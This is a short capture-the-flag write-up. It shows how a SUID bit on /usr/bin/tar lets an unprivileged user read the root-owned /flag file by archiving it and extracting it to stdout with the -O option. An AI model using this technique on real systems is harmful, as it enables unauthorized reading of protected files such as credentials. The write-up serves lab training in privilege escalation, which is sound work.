## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/tar`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/tar
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/tar
```

-The `s` in `-rws` indicates it's a SUID binary.
-`tar` runs with **root privileges**.

## üöÄ Exploitation

The `tar` command (short for "tape archive") is used to create, extract, and manage archives, usually with a .tar, .tar.gz, or .tar.bz2 extension.

But along -c(create archieve) , -x(extract archieve) , one option -O can be usedto output the content to stdout instead of disk.

With this method we can easily reveal the flag, Let's se how? :


```bash
cd /
tar -cf myflag.tar flag
tar -xf myflag.tar flag -O
```

With the help of -O , now the content of flag is in stdout and will be printed on terminal.

Output:
```

```
